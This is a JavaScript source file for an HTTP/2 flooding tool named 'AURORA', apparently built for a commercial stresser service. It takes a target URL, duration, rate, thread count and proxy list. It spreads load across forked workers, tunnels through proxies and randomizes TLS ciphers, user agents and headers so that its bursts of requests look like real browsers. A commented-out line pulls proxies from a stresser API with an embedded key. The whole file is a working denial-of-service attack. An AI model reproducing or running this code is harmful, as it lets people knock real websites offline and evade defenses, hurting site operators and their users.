
//Latest version made for webstress.app

 const net = require("net");
 const http2 = require("http2");
 const tls = require("tls");
 const cluster = require("cluster");
 const url = require("url");
 const crypto = require("crypto");
 const axios = require("axios");
 const fs = require("fs");
 const UserAgent = require("user-agents");

 process.setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
 process.on('uncaughtException', function (exception) {
  });

 if (process.argv.length < 7){console.log(`[AURORA] Usage: target time rate thread proxyfile`); process.exit();}
 const headers = {};
  function readLines(filePath) {
     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }

 function randomIntn(min, max) {
     return Math.floor(Math.random() * (max - min) + min);
 }

 function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
 }

 function randstr(length) {
   const characters =
     "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
   let result = "";
   const charactersLength = characters.length;
   for (let i = 0; i < length; i++) {
     result += characters.charAt(Math.floor(Math.random() * charactersLength));
   }
   return result;
 }

 const ip_spoof = () => {
   const getRandomByte = () => {
     return Math.floor(Math.random() * 255);
   };
   return `${getRandomByte()}.${getRandomByte()}.${getRandomByte()}.${getRandomByte()}`;
 };

 const spoofed = ip_spoof();

 const ip_spoof1 = () => {
   const getRandomByte = () => {
     return Math.floor(Math.random() * 50000);
   };
   return `${getRandomByte()}`;
 };

async function editedline() {
  try {
    // Code to fetch the proxy list can be added here if required
    // const response = await axios.get('https://tools.zerostresser.net:2096/proxies/http-s/all/text?key=oRRH57NRBmRK21eYf5u7XHQpveFQZ8SIB8lRxx0IXmbRTFXOlxP4vd7OUHpP20As');
    // const proxyList = response.data;
    // fs.writeFile('p.txt', proxyList, 'utf8', (error) => {
    //   if (error) {
    //     console.error('[AURORA] Error:', error);
    //   } else {
    //     console.log('[AURORA] I got the proxy list!');
    //   }
    // });
  } catch (error) {
    console.error('[AURORA] Error:', error);
  }
}

editedline();


 const spoofed1 = ip_spoof1();

 const args = {
     target: process.argv[2],
     time: parseInt(process.argv[3]),
     Rate: parseInt(process.argv[4]),
     threads: parseInt(process.argv[5]),
     proxyFile: process.argv[6]
 }
 const sig = [
    'ecdsa_secp256r1_sha256',
    'ecdsa_secp384r1_sha384',
    'ecdsa_secp521r1_sha512',
    'rsa_pss_rsae_sha256',
    'rsa_pss_rsae_sha384',
    'rsa_pss_rsae_sha512',
    'rsa_pkcs1_sha256',
    'rsa_pkcs1_sha384',
    'rsa_pkcs1_sha512'
 ];

 const cplist = [
    "ECDHE-ECDSA-AES128-GCM-SHA256",
    "ECDHE-ECDSA-CHACHA20-POLY1305",
    "ECDHE-RSA-AES128-GCM-SHA256",
    "ECDHE-RSA-CHACHA20-POLY1305",
    "ECDHE-ECDSA-AES256-GCM-SHA384",
    "ECDHE-RSA-AES256-GCM-SHA384"
 ];
 const accept_header = [
    '*/*',
    'image/*',
    'image/webp,image/apng',
    'text/html',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
 ];

 lang_header = [
  'ko-KR',
  'en-US',
  'zh-CN',
  'zh-TW',
  'ja-JP',
  'en-GB',
  'en-AU',
  'en-GB,en-US;q=0.9,en;q=0.8',
  'en-GB,en;q=0.5',
  'en-CA',
  'en-UK, en, de;q=0.5',
  'en-NZ',
  'en-GB,en;q=0.6',
  'en-ZA',
  'en-IN',
  'en-PH',
  'en-SG',
  'en-HK',
  'en-GB,en;q=0.8',
  'en-GB,en;q=0.9',
  'en-GB,en;q=0.7',
 ];

 const encoding_header = [
  'gzip, deflate, br',
  'deflate',
  'gzip, deflate, lzma, sdch',
  'deflate'
 ];

 const control_header = ["no-cache", "max-age=0"];


 const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
 const ciphers1 = "GREASE:" + [
     defaultCiphers[2],
     defaultCiphers[1],
     defaultCiphers[0],
     ...defaultCiphers.slice(3)
 ].join(":");










 var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
 var siga = sig[Math.floor(Math.floor(Math.random() * sig.length))];
 var accept = accept_header[Math.floor(Math.floor(Math.random() * accept_header.length))];
 var lang = lang_header[Math.floor(Math.floor(Math.random() * lang_header.length))];
 var encoding = encoding_header[Math.floor(Math.floor(Math.random() * encoding_header.length))];
 var control = control_header[Math.floor(Math.floor(Math.random() * control_header.length))];
 var proxies = readLines(args.proxyFile);
 const parsedTarget = url.parse(args.target);

 if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {setInterval(runFlooder) }

 class NetSocket {
     constructor(){}

  HTTP(options, callback) {
     const parsedAddr = options.address.split(":");
     const addrHost = parsedAddr[0];
     const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
     const buffer = new Buffer.from(payload);

     const connection = net.connect({
         host: options.host,
         port: options.port
     });

     //connection.setTimeout(options.timeout * 600000);
     connection.setTimeout(options.timeout * 100000);
     connection.setKeepAlive(true, 100000);

     connection.on("connect", () => {
         connection.write(buffer);
     });

     connection.on("data", chunk => {
         const response = chunk.toString("utf-8");
         const isAlive = response.includes("HTTP/1.1 200");
         if (isAlive === false) {
             connection.destroy();
             return callback(undefined, "error: invalid response from proxy server");
         }
         return callback(connection, undefined);
     });

     connection.on("timeout", () => {
         connection.destroy();
         return callback(undefined, "error: timeout exceeded");
     });

     connection.on("error", error => {
         connection.destroy();
         return callback(undefined, "error: " + error);
     });
 }
 }


 const userAgent = new UserAgent();

 console.log(userAgent.toString());
 console.log(userAgent.platform);
  site = [
    'cross-site',
        'same-origin',
        'same-site',
        'none'
  ];
  var sites = site[Math.floor(Math.floor(Math.random() * site.length))];
    mode = [
    'cors',
        'navigate',
        'no-cors',
        'same-origin'
  ];

var modes = mode[Math.floor(Math.floor(Math.random() * mode.length))];
 const Socker = new NetSocket();
 headers[":method"] = "GET";
 headers[":authority"] = parsedTarget.host;
 headers[":path"] = parsedTarget.path;
 headers[":scheme"] = "https";
 headers["x-forwarded-proto"] = "https";
 headers["accept-language"] = lang;
 headers["accept-encoding"] = encoding;
 headers["cache-control"] = control;
 headers["sec-ch-ua-mobile"] = "?0";
 headers["sec-ch-ua-platform"] = userAgent.platform;
 headers["upgrade-insecure-requests"] = "1";
 headers["accept"] = accept;
 headers["user-agent"] = userAgent.toString();
 headers["sec-fetch-dest"] = "document";
 headers["sec-fetch-mode"] = modes;
 headers["sec-fetch-site"] = sites;
 headers["TE"] = "trailers";
 headers["sec-fetch-user"] = "?1";
 headers["x-requested-with"] = "XMLHttpRequest";
 headers["Cookie"] = "PHPSESSID=" + randstr(26);

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    // headers[":authority"] = parsedTarget.host;
    headers["origin"] = "https://" + parsedTarget.host;

    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 300,
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) return;

        connection.setKeepAlive(true, 200000);

        const tlsOptions = {
            secure: true,
            ALPNProtocols: ['h2'],
            sigals: siga,
            socket: connection,
            ciphers: cipper,
            ecdhCurve: "prime256v1:secp384r1:secp521r1",
            host: parsedTarget.host,
            rejectUnauthorized: false,
            servername: parsedTarget.host,
            secureProtocol: "TLS_method",
        };

        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);

        tlsConn.setKeepAlive(true, 60000);

        const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: {
                headerTableSize: 65536,
                maxConcurrentStreams: 10000,
                initialWindowSize: 6291456,
                maxHeaderListSize: 65536,
                enablePush: false
            },
            maxSessionMemory: 64000,
            maxDeflateDynamicTableSize: 4294967295,
            createConnection: () => tlsConn,
            socket: connection,
        });

        client.settings({
            headerTableSize: 65536,
            maxConcurrentStreams: 10000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 65536,
            enablePush: false
        });

        client.on("connect", () => {
            const IntervalAttack = setInterval(() => {
                const dynHeaders = {
                    ...headers,
                    
                };
                for (let i = 0; i < args.Rate; i++) {
                    const request = client.request(dynHeaders);

//Devlog section
                    request.on("response", response => {
                    //console.log("Response:", response);
                    request.close();
                    request.destroy();
                    return;
                    });

                    request.end();
                }
            }, 1500);
        });

        client.on("close", () => {
            client.destroy();
            connection.destroy();
            return;
        });
    }, function (error, response, body) {
                  connection.destroy();

        console.log("Error:", error);
    });
}

const KillScript = () => process.exit(1);

setTimeout(KillScript, args.time * 1000);
